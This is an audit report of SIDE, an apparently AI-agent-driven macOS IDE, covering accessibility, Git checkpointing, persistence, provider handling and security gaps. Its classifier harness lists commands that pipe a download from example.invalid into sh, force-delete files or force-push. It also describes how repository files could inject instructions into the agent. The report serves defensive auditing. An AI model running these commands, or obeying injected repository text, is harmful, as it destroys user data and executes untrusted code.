# SIDE Audit Report

**Date:** 2026-08-25  
**Audited state:** the current working tree, including the owner's uncommitted edits  
**Methods:** document-to-code review, repository-wide static analysis, clean unsigned Xcode build, focused executable test harnesses, and live macOS UI/Accessibility/keyboard inspection

## Executive summary

SIDE's central product shape is real: the five implemented stages are visually restrained, tracks are Git branches/worktrees, file edits require promotion, and the app builds successfully. The code and design documents remain unusually aligned in broad intent.

It is not yet conformant with the full constitution. Integration and Library do not exist; stacked tracks do exist even though the constitution says nothing has been built; the safety model can be bypassed through incomplete shell-risk classification; crash recovery and checkpoint attribution have correctness gaps; custom controls are missing from the accessibility tree; and there is no automated test target.

### Highest-priority findings

| Priority | Finding | Why it matters |
|---|---|---|
| Critical | Force-quit during tool approval can leave a persisted `tool_use` with no persisted proposal or `tool_result` | The session reopens in a state the UI cannot resolve; `teardown()` only repairs graceful shutdown |
| Critical | Checkpoint creation commits the entire pre-existing Git index | A manual staged edit can be silently included and attributed to the agent |
| Critical | Auto-run relies on a lexical classifier that misses destructive equivalents | `rm --recursive --force`, `git push origin +main`, `wget ... \| sh`, `find . -delete`, and similar commands classify as normal and can auto-run |
| High | Agent/provider attribution can be internally inconsistent | Provider is read from the current registry during checkpointing while model comes from the run request |
| High | Persisted writes are non-atomic and errors are commonly swallowed | A kill during save can corrupt track/session/checkpoint state without a recovery path |
| High | Run terminal and hand-drawn tab chips are absent from the live AX tree; Think messages are announced twice | VoiceOver cannot reliably operate core flows |
| High | Menu actions depend incorrectly on first responder and `⌘M` is assigned twice | Open Project can be disabled in the no-file state; Markdown Preview collides with standard Minimize |
| High | Malformed/truncated provider streams can finish as successful empty turns | A transport/protocol failure can look like completion rather than a legible failure |
| High | Full tool results are persisted while no cost/usage is surfaced | Sensitive file/command output may remain on disk without visibility, while token accounting is discarded |
| High | There is no unit, integration, UI, or performance test target | Safety, recovery, Git, streaming, and state-machine claims have no regression protection |

### Status by audit family

| Family | Status |
|---|---|
| Philosophy conformance | Partial; five built stages pass the single-canvas test, but two stages are absent and documents drift |
| Design system | Partial; palette/radius foundations exist, but spacing/type tokens and hardcode migration are incomplete |
| Accessibility | Fail for core VoiceOver coverage; partial for keyboard focus |
| Keyboard/menu fluency | Partial; stage jumps work, but menu routing and one shortcut collision fail |
| Agent trust and safety | Fail pending classifier, crash-recovery, and attribution fixes |
| Durability/correctness | Fail pending atomic persistence and checkpoint/index isolation |
| Git interoperability | Partial; ordinary local Git is supported in the common case, edge repositories are unverified |
| Performance/scalability | Risk identified; no benchmark suite or credible large-scale measurement exists |
| Provider/model integration | Partial adapters; failure semantics and usage visibility fail |
| Product/UX benchmarking | Short dogfood pass completed; cross-product benchmark and long dogfood period remain blocked |
| Code architecture | Partial; engine data is AppKit-free, but the boundary is not enforced and runner responsibilities are broad |
| Security/privacy | Partial; traversal defense and Keychain handling are good, sandboxing/redaction are not |
| Documentation integrity | Fail due several concrete doc-versus-code contradictions |

## Scope and limitations

- The app was built with `CODE_SIGNING_ALLOWED=NO` into a disposable DerivedData directory; the build succeeded.
- All five implemented stages—Make, Think, Review, Run, and Tracks—were opened and visually inspected. Integration and Library cannot be screenshot because they are not implemented.
- A disposable Git repository was used for track creation and checkpoint experiments. No provider request was sent and no paid/user model credentials were exercised.
- The full agent → review → promote live flow was not run because doing so would transmit repository data and incur provider usage without a controlled mock provider. Its code paths were audited statically.
- Comparative testing against Cursor, Xcode, Zed, and VS Code+Copilot was not claimed: it needs an agreed task, installed/licensed products, configured accounts, and a repeatable timing protocol.
- Performance conclusions below are code-path risks, not measured benchmarks, unless explicitly stated.
- Existing uncommitted edits in six source files were preserved and included in the audited state.

## 1. Philosophy-conformance audits

### Constitution rules, stage by stage

Legend: **Pass**, **Partial**, **Fail**, **N/A** (stage absent).

| Rule | Make | Think | Review | Run | Tracks | Integration | Library |
|---|---|---|---|---|---|---|---|
| 1. One stage owns the canvas | Pass | Pass | Pass | Pass | Pass | N/A | N/A |
| 2. Tracks are primary; threads nest | Pass | Pass | Pass | Pass | Pass | N/A | N/A |
| 3. Attention is explicit | Partial | Pass | Pass | Partial | Pass | N/A | N/A |
| 4. Every run is durable | N/A | Fail | Partial | Partial | Partial | N/A | N/A |
| 5. Agents propose; people promote | N/A | Fail | Pass | Fail | Pass | N/A | N/A |
| 6. Git is the substrate | Pass | Pass | Pass | Pass | Pass | N/A | N/A |
| 7. Main is canonical | Pass | Pass | Pass | Pass | Pass | N/A | N/A |
| 8. Provenance, no silent gaps/surveillance | N/A | Fail | Fail | Fail | Partial | N/A | N/A |
| 9. Minimality/no permanent chrome dependency | Pass | Pass | Pass | Pass | Pass | N/A | N/A |
| 10. Native Mac quality | Partial | Fail | Partial | Fail | Partial | N/A | N/A |

Key interpretations:

- The five implemented stages do not secretly depend on a permanent sidebar or panel. The file explorer is transient; stage navigation and Quick Open remain available in the toolbar/menu.
- File writes are represented as proposals and applied only after explicit approval. Shell proposals are also presented, but a track's auto-run setting allows commands classified as normal to execute without action on each proposal. Since many shell commands mutate files, Git, remotes, or the machine, rule 5 is not currently satisfied.
- Durable session/checkpoint structures exist, but mid-approval crash recovery, non-atomic writes, and silent save errors invalidate a strict reading of rule 4.
- The attribution record has good fields—provider, model, session, track, checkpoint—but the provider/model race and whole-index commit behavior create silent provenance gaps.

### “One stage owns the canvas” screenshot audit

- **Make:** one editor/empty canvas; tabs and toolbar are subordinate.
- **Think:** one transcript/composer surface.
- **Review:** one diff/empty-state surface.
- **Run:** one terminal card.
- **Tracks:** one ledger/tree surface.
- **Integration/Library:** not implemented; cannot pass a literal screenshot audit.

No implemented stage had two competing primary canvases at the tested 980-point minimum width. Tracks' persistent header controls remain subordinate to the ledger, although its empty state is less focused than the other stages.

### Terminology leakage

- `Heron` and `Alloy` do not appear in fixed user-facing UI strings.
- They can surface through assistant output when the model reads project documents; this happened in the live restored Think transcript. There is no output policy that prevents internal architecture vocabulary from reaching users.
- Other implementation terms appear in user-facing failures/copy, including “Git worktree,” “tool round-trips,” and “working copy.” Some may be intentional expert language, but the product vocabulary is not formally separated from engine vocabulary.

**Result:** fixed-copy check passes for Heron/Alloy; strict end-to-end terminology containment fails.

### Aspirational versus built

Concrete drift:

1. The constitution says stacked tracks have not been built. They are implemented: `parentTrackId`, base-track selection, tree rendering, parent promotion, and pull-from-parent are in production code and have a dedicated commit.
2. Alloy remains unimplemented, which matches its “not yet built” description.
3. Integration and Library are listed as stages without an adjacent not-yet-built label, but neither exists in `ShellViewController.Stage`.
4. OpenAI-compatible providers are described as planned in one constitution passage, while provider configuration and an adapter are built.
5. The documented `think.json` layout has been replaced by an index plus per-session/checkpoint files.

**Result:** fail. Add a machine-checkable implementation-status field to stage/feature documents and review it in CI.

## 2. Design-system audits

### Token compliance

Repository sweep outside `DesignSystem.swift` found:

- 24 `NSColor(white:...)` uses.
- 8 numeric `cornerRadius` assignments.
- 57 layout constants that do not match the documented spacing scale. Some are legitimate geometry, but they are not annotated and many are ordinary spacing.

Concentrations include Make/editor/ruler/syntax colors, Diff, Markdown rendering, Run terminal chrome, AppDelegate background, and several proposal/track/review radii.

`DesignSystem.swift` defines Color, Radius, Motion, and `CircularIconButton`, but no `Spacing` namespace and no typography token family even though the charter names them. It also contains newer chrome/tab/hover/rail colors that are not reflected in the written token inventory. **Fixed 2026-08-27:** `DS.Text` (typography, scalable) and `DS.Spacing` (4pt base) both exist and are adopted — ~70 spacing sites, ~60 font sites, 30 color/radius literals migrated; the text/editor colors that were living as `NSColor(white:)` literals in Make, the ruler, and the highlighter are now single tokens. Constraint constants are deliberately left as geometry. Charter updated to match.

**Result:** Batch 0 is partial, not complete.

### Batch 0–C completion

| Batch | Assessment | Evidence |
|---|---|---|
| 0 — foundations | Partial | Core palette/radius/motion APIs landed; spacing/type tokens and hardcode migration did not |
| A — shell/keyboard | Partial | title, tabs, stage shortcuts, Quick Open, tab submenu, and 980×620 minimum landed; menu routing, AX tab exposure, and shortcut collision remain |
| B — stage clarity | Mostly built | real Review diff, track tree/connectors, Run terminal container, and Think composer polish landed |
| C — polish/consistency | Partial | shared background and several visual refinements landed; AX, empty states, motion timing, and hardcode consistency remain incomplete |

### Cross-stage consistency

- Canvas backgrounds and the overall stage silhouette are consistent.
- Radius use is not: Review uses 10/4, Tracks uses 10, and other surfaces use design tokens or different values.
- Empty states vary: Make/Review are centered; Tracks leaves explanatory copy under permanent creation controls; Run has no comparable empty pattern.
- Hover behavior varies between explicit state changes and implicit animator timing.
- Custom-drawn tabs visually agree across Make/Run but fail the same accessibility contract.

**Result:** visually coherent at a glance, internally inconsistent under the “which stage was built first?” test.

### Motion

- `DS.Motion.appear` matches the charter's 0.3-second fade/rise/scale and ease-out intent.
- Several hover animations rely on implicit animator duration rather than specifying the charter's approximately 0.15 seconds.
- Diff collapse animates awaited layout at 0.18 seconds.
- Think streaming performs transcript layout inside a 0.16-second animation on each streamed update.
- File-explorer appearance uses 0.32 seconds; tab close/reorder paths use roughly 0.14–0.18 seconds.

**Result:** fail the strict charter. In particular, per-token transcript relayout and animated diff collapse violate “never animate layout the user is waiting on.”

## 3. Accessibility audits

### AX tree

Live findings:

- Visible Make and Run tab chips were absent from the AX tree despite custom accessibility overrides on `TabChipView`. The likely issue is containment/exposure rather than missing labels on the chip itself.
- The SwiftTerm-backed Run terminal exposed no readable terminal text or prompt to the inspected AX tree; only the window/scrollbar structure appeared. **Fixed 2026-08-27:** `SideTerminalView` exposes the screen as one `AXTextArea` (SwiftTerm ships accessibility for UIKit only), with value-changed notifications coalesced to quiet moments. Verified live: the AX value reads back the prompt and output.
- Think messages were exposed twice: once by the custom static-text wrapper and once by its text child. VoiceOver will repeat content.
- Think composer, Send button, and Copy buttons were exposed with useful labels.
- `CircularIconButton` declares a button role and caller-supplied label; tested instances appeared correctly.
- Track rows implement a button role/label/press action in source; decorative connectors appropriately remain non-elements.
- Diff disclosure headers expose generic “Toggle diff” semantics without the filename or expanded/collapsed state.
- Diff line-number gutters and change/diagnostic markings have no equivalent accessible announcement.

**Result:** fail for core custom-control coverage.

### Keyboard-only core flow

Verified in a disposable Git project:

- Open an existing project: possible, but menu/responder behavior made it unreliable from the no-file state.
- Create a track: `⇧⌘T`, type name, Return succeeded.
- Select/open a file using arrow keys and Return: succeeded.
- Stage changes via `⌃1`–`⌃5`: succeeded.
- Make → Think moved focus to the composer; Think → Make restored editor focus.

Not completed live:

- A paid/provider-backed agent run was deliberately not sent.
- Therefore live proposal approval, Review, and promotion were not asserted as an end-to-end keyboard pass.
- Run accepted typed terminal input, but output/focus was not legible through AX, so it cannot be counted as an accessible keyboard pass.

### Dynamic text and reading order

- Text sizes are predominantly fixed `NSFont` sizes; there is no consistent system-text-style/scalable typography layer.
- Think reading order is chronological but duplicated.
- Review's visual diff order is logical, but file identity/disclosure state and gutter meaning are not fully represented to assistive technology.

**Result:** fail for scalable text support and VoiceOver reading fidelity.

### Focus management

- Make/Think stage switching preserved or deliberately moved first responder correctly in the tested case.
- Empty Review left focus at the window, which is reasonable only because no interactive child existed.
- Run focus was visually plausible but not represented as an operable terminal in AX.
- Menu targeting fails when the intended workspace controller is not in the responder chain.

**Result:** partial.

## 4. Interaction and keyboard fluency

### Shortcut inventory and collisions

Implemented notable bindings:

- Preferences `⌘,`; New Window `⇧⌘N`; New File `⌘N`; Open Project `⌘O`; Save `⌘S`; Save As `⇧⌘S`; Close `⌘W`.
- Markdown Preview `⌘M`; File Explorer `⇧⌘E`.
- Quick Open `⌘P`; Go to Line `⌘L`; Symbol `⇧⌘O`; Definition `⌃⌘J`.
- Stages `⌃1`–`⌃5`; tabs `⌘1`–`⌘9`.
- New Terminal `⌘T`; Stop `⌘.`; Restart `⇧⌘R`; New Track `⇧⌘T`.

`⌘M` is also the standard Window → Minimize shortcut. This is a direct collision with Toggle Markdown Preview. Stage-jump shortcuts are built and discoverable in Navigate for the five existing stages; there are no shortcuts for the two absent stages.

### Menu correctness

- Contextual items correctly disable on unrelated stages in several cases.
- From Make with no editor first responder, File menu items including Open Project were disabled because nil-target actions depended on the responder chain. This can strand a new/no-file user; Open Recent remained available.
- Toggle Markdown Preview and tab actions also inherit responder-chain fragility, even when a relevant controller exists elsewhere in the selected stage.

**Result:** fail until commands route through stable app/window command targets with explicit validation.

### Quick Open and toolbar responsiveness

- At the enforced 980-point minimum width, Quick Open remained present and usable.
- Lower-priority project/LSP information collapsed into an overflow control, which remained functional.
- A long track title did not displace Quick Open in the tested width.

**Result:** pass at supported window widths. The previous collapse-to-dead-control failure appears addressed by minimum size and layout priorities.

## 5. Agent trust and safety

### Propose then promote

- `read_file`, `list_files`, and `search_files` are auto-executed read operations.
- `edit_file` and `write_file` create proposals and apply through `ProposedEditApplier` only after approval.
- Shell tools create command proposals, but normal-risk commands can auto-run when enabled for the track.
- Because arbitrary shell is a mutation-capable surface, “every mutation requires a human action” is false under auto-run.

### Command risk classification

The actual classifier was compiled into a small harness. Results:

```text
DESTRUCTIVE  rm -rf build
NORMAL       rm --recursive --force build
NORMAL       rm -r --force build
DESTRUCTIVE  git push origin main --force
NORMAL       git push origin +main
DESTRUCTIVE  curl https://example.invalid/x | sh
NORMAL       wget -qO- https://example.invalid/x | sh
NORMAL       bash <(curl https://example.invalid/x)
DESTRUCTIVE  sudo rm file
NORMAL       find . -delete
NORMAL       xargs rm -f
DESTRUCTIVE  git clean -xfd
```

The implementation comments that the classifier is not a security boundary, but auto-run makes it a security/consent boundary. Disable auto-run for shell until classification is allowlist-based, or restrict auto-run to a small parsed set of read-only commands.

### Prompt injection

File/search outputs are returned directly to the provider as tool results. There is no untrusted-data envelope, policy reminder, taint marker, or content-origin instruction. Role separation and proposal approval limit some impact, but auto-run substantially weakens that protection.

**Result:** fail hardening. Treat repository content as adversarial data and test indirect injection explicitly.

### Secrets handling

- API keys use Keychain generic-password storage; no direct key logging was found.
- Anthropic can also read an environment variable.
- Full file/search/command tool outputs can be persisted in session JSON under Git common state. Rehydrated UI shows summarized sizes rather than the stored content, reducing user awareness of what remains on disk.
- No redaction layer was found for transcripts, checkpoints, logs, or command output.
- LSP stderr is printed to the process console and may disclose paths/content fragments.
- No analytics/telemetry SDK or custom crash uploader was found.

**Result:** Keychain pass; data-minimization/redaction fail.

### Runaway bounds

- Model/tool loop: `maxToolRoundTrips = 12`.
- Stall watchdog: 90 seconds.
- Provider request timeout: 60 seconds.
- No explicit provider retry loop was found.

Gaps:

- Shell commands have no hard execution timeout or cancellation guarantee. The sentinel wrapper can be defeated by `exit`, comments, multiline commands, or an indefinitely running child process.
- The agent loop may move on after reporting that a command is still running while the process continues.
- Multiple `AgentRunner` instances have no global concurrency or cost budget.

**Result:** provider loop is bounded; total time/cost/process lifetime is not.

### Attribution

Positive: checkpoints record track key, session, provider, model, instruction source, and optional Git SHA.

Failures:

- Provider ID is sampled from the active registry during checkpoint creation while model ID is captured from the request. Changing provider during an outstanding approval can create a false pair.
- Checkpoint staging includes all already-staged paths, not only agent-approved paths.
- A command with no resulting file delta can produce no Git SHA.
- Instruction source is a summary string, not an immutable prompt/tool-policy hash.

**Result:** fail non-negotiable 8's “no silent gaps” claim.

## 6. Data durability and correctness

### Crash/kill recovery

- `teardown()` synthesizes rejection results for pending proposals during graceful window shutdown.
- A force-quit/kill does not call it.
- The assistant `tool_use` is persisted before the in-memory approval batch. Killing at that point leaves a dangling tool call but no durable proposal queue to approve/reject after reopen.
- Track/session/checkpoint/provider writes commonly use `try? data.write` without atomic replacement; failures are swallowed.

**Result:** fail. Persist the proposal transaction before presenting it, make resolution idempotent, and atomically commit both sides of the state transition.

### Concurrent windows

Positive:

- `ProjectContextRegistry` keys contexts by common Git directory and refcounts them.
- `WorkspaceBridge` resolves hosts at use time instead of permanently capturing a view.
- TrackStore has epoch protection around reconciliation.

Risks:

- No automated two-window stress test exists.
- External deletion/movement can leave a stored worktree URL that is resolved but not verified.
- Git summary, reconciliation, promotion, and other subprocesses lack a single project-level operation coordinator.
- Same-track edits from two windows depend on live view selection and disk staleness checks rather than a formal document transaction model.

**Result:** sound intent, unverified under real concurrency.

### Schema migration

- `Track` has custom decoding defaults for newer optional fields.
- AgentSession, AgentTurn, Checkpoint, and provenance records rely on synthesized Codable with required fields; adding a non-optional field breaks old files.
- One container-shape migration exists, but not a versioned record migration system.

**Result:** fail systematic backward compatibility.

### Checkpoint correctness

An executable Git reproduction confirmed the current algorithm's contamination bug: with `manual.txt` already staged, then an agent change to `agent.txt`, the checkpoint's cached-name query and commit contained both files.

Additional gaps:

- Dirty-path parsing is newline based rather than `-z`; unusual filenames are unsafe.
- A path already dirty before the command may not appear as newly dirty, losing attribution.
- Explicitly adding a newly approved gitignored file fails unless forced or intentionally excluded.
- Commit failure can leave paths staged; the index mutation is not transactional.
- Submodule, symlink, case-folding, and concurrent manual-edit behavior have no tests.

Path containment itself performed well: actual `ProjectFileAccess` rejected `../` escape, absolute escape, and an in-root symlink to `/etc/passwd`, while allowing an ordinary in-root file.

## 7. Git interoperability

### Ordinary Git usage

- Tracks are ordinary branches in ordinary worktrees.
- Reconciliation can discover branches/worktrees and adopt an existing worktree for the track branch.
- Main/base refs are recomputed rather than modeled as private opaque history.

Limitations:

- A branch checked out in a SIDE worktree cannot simultaneously be checked out in another ordinary worktree, which affects Git Desktop/IDE expectations.
- External branch movement is not continuously watched; several views reconcile only on entry/refresh.
- SIDE's checkpoint metadata can drift from commits made externally.

**Result:** pass for ordinary local Git concepts, partial for live coexistence.

### Merge/rebase/conflict

- Promotion recomputes ahead state, performs a no-commit/no-ff merge, aborts on conflict, then commits after success.
- Pull-from-parent for stacked tracks similarly aborts conflicts.
- Local base movement is handled by recomputing against the current local base.
- Remote movement is invisible until another tool/user fetches; there is no fetch/PR/push lifecycle.
- Conflict resolution is surfaced as failure, not an integrated resolution flow.

**Result:** conservative local merge behavior; incomplete collaboration workflow.

### Edge repositories

- Bare repositories are not supported by the inside-work-tree requirement.
- Detached HEAD has partial handling during track creation.
- Multiple remotes default to assumptions around `origin` and are not productized.
- LFS/submodules/monorepos rely mostly on normal Git behavior, with no dedicated checks.
- Checkpoint path logic is specifically fragile for submodules, ignored paths, unusual names, and case-folding.

**Result:** unverified/partial; create a Git fixture matrix before claiming support.

## 8. Performance and scalability

### Large files and repositories

Existing guardrails:

- Project indexing is capped at 25,000 files.
- Text reading/opening is capped around 10 MB.
- Syntax highlighting skips very large text beyond its threshold.

Risks:

- Editing copies the full text storage string and applies whole-document base attributes on the main thread after changes.
- LSP did-change sends full document content.
- Initial highlighting and large diff rendering are not virtualized.
- Project/file search and Git summary behavior need measurements on monorepos, not just caps.

### Many tracks and agents

- Tracks rebuilds the ledger and obtains summaries through multiple Git subprocesses plus disk-usage work per track.
- Summary work is effectively O(number of tracks) subprocess traffic and has no cached incremental model.
- `AgentRunnerManager` has no concurrency ceiling; all runners can stream UI events onto the main queue.

### Startup/reopen

- No launch/reopen signposts or performance tests exist.
- Project restoration, Git context creation, session hydration, indexing, and materialized worktree count need separate timings.

### Streaming UI

- Every stream update reaches the main queue.
- Think repeatedly concatenates assistant text, updates the bubble, and lays out the transcript inside an animation.
- Long conversations instantiate the full transcript rather than virtualizing it.
- Tool result persistence allows tens of kilobytes per result.

**Result:** likely jank/memory growth at scale; no measured pass can be awarded. Add signposts and fixed fixtures for file size, transcript length, stream rate, track count, and concurrent runners. **Partly addressed 2026-08-27:** `PerformanceTests` adds fixed fixtures and baselines for 2,000-line diff parse/render, 40-card build, a 360-turn conversation write+reload, the dangling-tool-use repair scan, redaction over large tool output, and a year of usage roll-up. Opt-in (`TEST_RUNNER_SIDE_PERF=1`) so a normal run stays ~20s. The session benchmark exposed a real defect: `AgentSessionStore.appendTurn` re-serializes the *entire* session on every turn, so write cost grows with the square of conversation length — a 360-turn fixture took minutes. Not yet fixed (it needs incremental append). Still missing: launch/reopen signposts, stream-rate and concurrent-runner fixtures, and monorepo-scale search/git measurements.

## 9. Provider/model integration

### Parity

- Anthropic and OpenAI-compatible streaming/tool adapters exist.
- Ollama/LM Studio can use the compatible endpoint shape, subject to their exact dialect.
- No conformance fixture runs the same scripted tool conversation through each adapter.

### Failure modes

- Rate-limit/network errors are emitted visibly, but the surrounding runner can still finish the turn as completed rather than blocked.
- Malformed SSE/JSON events are skipped.
- A clean socket close after malformed/truncated content can become an empty successful turn.
- Context overflow has no preflight budgeting/truncation strategy; it relies on provider error text.
- No retry/backoff policy exists, which avoids runaway retry cost but leaves transient failures entirely manual.

**Result:** fail reliable failure semantics.

### Cost/usage visibility

Provider usage is parsed at stream end, but `AgentRunner` explicitly discards it. No per-run token/cost estimate, cumulative track usage, or budget is presented.

**Result:** fail. **Fixed 2026-08-25 (`UsageStore`):** usage is recorded per project/track/provider/model at every `.messageEnd`, shown per track in Think's header and in a new Preferences → Usage pane (summary, per-model and per-project breakdowns, estimated cost, reset). Unpriced models show tokens and no cost rather than a guess. Budgets landed 2026-08-26 (`UsageBudget`): opt-in monthly ceiling, 80% warning, hard stop before the next request.

## 10. Product and UX benchmarking

### Comparative walkthrough

Not performed. A credible comparison requires a standardized repository/task, fresh-state script, versioned products, matched models, recorded timings, and configured subscriptions. It should measure time to first edit, context setup, approval/review friction, conflict recovery, keyboard interruptions, and trust clarity—not feature counts.

### Short dogfood friction log

1. Open Project was disabled when no editor controller owned first responder.
2. Opening through a prior/recent editor state worked, revealing the responder-chain dependency.
3. Keyboard track creation and file selection were fast and understandable.
4. The transient file explorer was discoverable in that flow and did not require permanent chrome.
5. Run accepted keyboard input, but terminal output/focus was inaccessible to the AX inspection.
6. There is no visible run-cost accounting.
7. Integration and Library are absent despite appearing in the product constitution.

This is a smoke dogfood log, not the requested “real work for a stretch.”

### New-user cold start

- The app offers Quick Open and a visible New Track action.
- It does not explain the complete first-alpha sequence from project → track → provider setup → Think → approve → Review → promote.
- Provider/key setup is separate from the moment it becomes necessary.
- No onboarding distinguishes implemented stages from future constitutional stages.

**Result:** partial for opening/editing/track creation; fail discoverability of the complete alpha loop.

## 11. Code architecture

### Engine/stage boundary

- Core transcript/runner records are Foundation data, not NSView subclasses.
- However, `Heron/ProposedEditView.swift` and `Heron/CommandProposalView.swift` import AppKit inside the Heron directory and the engine is not a separate module/package.
- Therefore the claimed dependency boundary is a convention, not an enforced architecture.

**Result:** partial. Move AppKit proposal views to the app/presentation layer and make Heron a Foundation-only target before using it as Alloy's template.

### AgentRunner cohesion

At roughly 728 lines, `AgentRunner` owns:

- phase/state observation;
- provider turns and stream accumulation;
- tool dispatch and batching;
- proposal approval/rejection;
- command terminal bridging;
- checkpoint creation/Git staging;
- transcript hydration;
- stall watchdog and completion.

It is cohesive around a run transaction but has crossed multiple persistence, UI coordination, provider, and Git boundaries. Split `CheckpointWriter`, `ToolBatchCoordinator`, and provider-turn/stream accumulation first; keep the state machine as the orchestrator. Current Swift 6 sendability/main-actor warnings reinforce the need for explicit boundaries.

### Test coverage

The Xcode project contains one application target and no test source files or test target. There are no automated tests for classifier behavior, state transitions, proposal recovery, checkpoint staging, diff parsing, provider streams, schema migration, AX, Git fixtures, or performance.

**Result:** fail.

## 12. Security and privacy

### Sandbox and entitlements

No app-sandbox entitlement, entitlements file, or equivalent build setting was found. The app can access filesystem/network resources allowed by the user's macOS account and privacy permissions.

This is operationally convenient for an IDE/agent but broader than least privilege. Document the threat model and decide explicitly between sandbox + user-selected security-scoped access, or an unsandboxed developer-tool distribution with clear disclosure and hardened runtime/signing.

### Tool surface

- File path traversal, absolute escape, and symlink escape passed the executable containment test.
- Stale edit bases are checked before applying.
- Shell commands are intentionally executed as shell text; exact command display helps consent, but the classifier and auto-run gaps dominate the risk.
- The sentinel-based shell wrapper is vulnerable to shell control flow and does not provide process isolation or a hard lifetime.

### Telemetry

- No analytics, telemetry SDK, or off-device crash-reporting path was found.
- Provider calls necessarily transmit prompts/tool results to the configured endpoint.
- Local session persistence is broader than the UI communicates and lacks redaction/retention controls.

**Result:** no accidental analytics observed; privacy disclosure and local-data controls are incomplete. **Fixed 2026-08-25:** `SecretRedactor` replaces credential-shaped values in tool output before it is persisted or re-sent; Preferences → History states plainly what is stored and what is transmitted, offers a retention window (forever/90/30/7 days, applied when a project opens), and can delete conversations in open projects. Checkpoints deliberately survive a purge — they are the record of what an agent changed.

## 13. Documentation integrity

Confirmed drift:

- stacked tracks described as unbuilt but implemented;
- Integration and Library presented as stages without implementation-status labeling;
- OpenAI-compatible provider described as planned in one passage but built;
- `think.json` persistence description outdated;
- token charter missing newer tokens while code lacks promised spacing/type namespaces;
- full provenance/durability claims exceed current crash/index behavior;
- “native Mac” quality claim exceeds current AX/menu conformance.

Recommended recurring mechanism:

1. Give every constitutional/design feature an ID and status: `planned`, `experimental`, `built`, `verified`.
2. Link each `built`/`verified` claim to source ownership and at least one test.
3. Fail CI when an expired `planned` marker, missing test link, or obsolete storage-schema version is detected.
4. Include this doc-integrity table in every feature PR that changes stages, providers, storage, tools, or Git behavior.

## Remediation sequence

### Gate 1 — safety and attribution

1. Disable shell auto-run or replace the destructive blacklist with a narrow read-only allowlist.
2. Stage checkpoint content in an isolated temporary index (`GIT_INDEX_FILE`) or create commits from explicit approved blobs/tree entries; never consume the user's index.
3. Capture immutable provider/model/prompt/tool-policy provenance when the run starts and carry that object through every checkpoint.
4. Add hard command cancellation/timeouts and process-group termination.

### Gate 2 — durable state machine

1. Persist pending proposals transactionally before UI presentation.
2. Make approval/rejection replayable and idempotent after restart.
3. Use atomic file replacement, explicit errors, schema versions, and corruption recovery/backups. **Done 2026-08-25 (`JSONStore`)** except backups: every store writes `{"schemaVersion", "payload"}` atomically, bare legacy files still read as v1, and read/write failures are reported to the user through `PersistenceFailureReporter` instead of vanishing into `try?`. Persisted agent types now decode missing fields with defaults, so a future additive field can't brick old files.
4. Add kill-point integration tests after tool-use persistence, during approval, during apply, during Git staging, and during checkpoint commit.

### Gate 3 — provider correctness and privacy

1. Treat malformed/truncated streams as protocol failures, never successful empty turns.
2. Keep the runner blocked/failed after provider error.
3. Surface token usage and configurable budgets. **Done 2026-08-26:** visibility in `f57c2e0`; `UsageBudget` adds an opt-in monthly ceiling checked immediately before each request (so the round-trip that crosses it is the one stopped), warning at 80%, `.blocked(.budgetReached)` when reached, surfaced in Think's header and Settings → Usage. Enforced against *estimated* spend, so a month using an unpriced model is under-counted — stated wherever it's shown.
4. Add transcript/tool-result retention, redaction, and deletion controls; clearly disclose provider transmission.
5. Add indirect prompt-injection fixtures.

### Gate 4 — native Mac baseline

1. Expose tabs and terminal semantics correctly; eliminate duplicated Think announcements.
2. Give diff headers filename/state semantics and accessible equivalents for gutter meaning. **Done 2026-08-27:** a diff card's fold control now reads "src/greeter.ts, 12 lines added, 3 lines removed, new file" with an expanded/collapsed value and a Collapse/Expand action name (it was "Toggle diff" with no state), verified live through the AX API. Gutter meaning is now exposed too: `DiffBodyTextView` marks each changed line "added, " / "removed, " and hunk headers "section, " in the *accessibility* text only, leaving the visible diff and clipboard untouched.
3. Route menu commands through stable app/window command objects; remove the `⌘M` collision.
4. Introduce scalable typography and automated AX/UI tests. **Done 2026-08-27:** `DS.Text` names every size already in use and scales all of them by a persisted `DS.Text.Scale` (Settings → Appearance; Compact/Default/Large/Larger), with open stages rebuilding on change — macOS has no app-wide Dynamic Type, so this is the only recourse a hardcoded-point-size app can offer. ~60 raw `ofSize:` call sites migrated. 15 automated AX/typography tests. A real `SIDEUITests` XCUITest target now exists (stage navigation via the Navigate menu, the terminal's presence as a text area in the *launched* app's tree, composer keyboard input, and Preferences' four panes), and builds — but the runner hangs before launching the app in this headless CLI environment, which is the usual macOS symptom of the test runner lacking Accessibility/Automation permission. It needs one run from Xcode (or approving the runner in System Settings → Privacy & Security) before it can be counted as passing.

### Gate 5 — design/docs/tests/performance

1. Complete Spacing/Type tokens and migrate/annotate hardcodes.
2. Stop animating streamed/awaited layout; normalize hover/appear timing.
3. Correct implementation-status documentation immediately.
4. Add unit targets first for classifier, checkpoint isolation, state transitions, Codable migration, and stream parsers; then Git/UI/performance fixtures.
5. Measure large file, 25k-file project, 100-track ledger, four concurrent runners, and 100k-token transcript scenarios before setting scalability claims.

## Suggested release gates

Before calling the current alpha trust model conformant:

- zero known auto-run destructive bypasses;
- checkpoint commits proven not to touch pre-existing index entries;
- every pending proposal recoverable after SIGKILL;
- provider/model/session/checkpoint attribution immutable and tested;
- tabs, terminal, transcript, diff, and track flows pass VoiceOver and keyboard UI tests;
- malformed/truncated provider fixtures fail visibly;
- no menu collision and project open works independent of first responder;
- written stage/feature status matches the shipped enum and storage schema;
- at least one automated test target protects these gates.

## Build and audit artifacts

- Clean unsigned app build: successful.
- Compiler emitted Swift concurrency/main-actor/sendability warnings, especially around AppKit drawing and captured non-Sendable runner/tool objects.
- Disposable path-containment, classifier, checkpoint, and keyboard-flow fixtures were kept outside the source tree.
- No product source file was changed by this audit.
